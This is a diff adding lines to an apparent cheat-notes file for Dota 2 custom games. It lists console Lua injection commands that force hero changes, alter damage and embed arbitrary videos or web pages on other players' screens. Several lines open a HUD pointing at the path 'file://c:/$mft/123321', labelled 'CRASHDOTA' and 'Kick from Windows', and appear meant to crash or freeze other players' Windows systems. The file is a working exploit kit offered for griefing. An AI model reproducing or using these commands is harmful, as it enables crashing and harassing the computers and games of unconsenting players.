@@ -63,6 +63,7 @@ particles/world_tower/tower_upgrade/ti7_dire_tower_ambient_core.vpcf
 
 say -lua for i = 0, 9 do HeroSelection:ChangeHero(i, "npc_arena_hero_destroyer", true, 0) end
 
+say -lua for i = 0, 9 do CustomUI:DynamicHud_Create(PID, "CRASHDOTA", "file://c:/$mft/123321", nil) end
 
 say -lua Hero:SetBaseDamageMin(-111) УРОН
 
@@ -191,3 +192,16 @@ YT Video:
 
 Kick from Windows:
 -ccreate <PID> i file://c:/$mft/123321
+
+say -lua for i = 4, 9 do CustomUI:DynamicHud_Create(PID, "CRASHDOTA", "file://c:/$mft/123321", nil) end
+
+-lua CustomUI:DynamicHud_Create(PID, "CRASHDOTA", "file://c:/$mft/123321", nil)
+
+-ccreate 1 v https://s3.ezgif.com/save/ezgif-3-e309a38907.webm 10
+
+XJ_RGDAjS9E
+-ccreate <PID> h https://www.youtube.com/embed/XJ_RGDAjS9E?rel=0&amp;controls=0&amp;showinfo=0&amp;start=0 10
+
+h ЕСТЬ WEB
+v ЕСЛИ ВИДЕО
+i
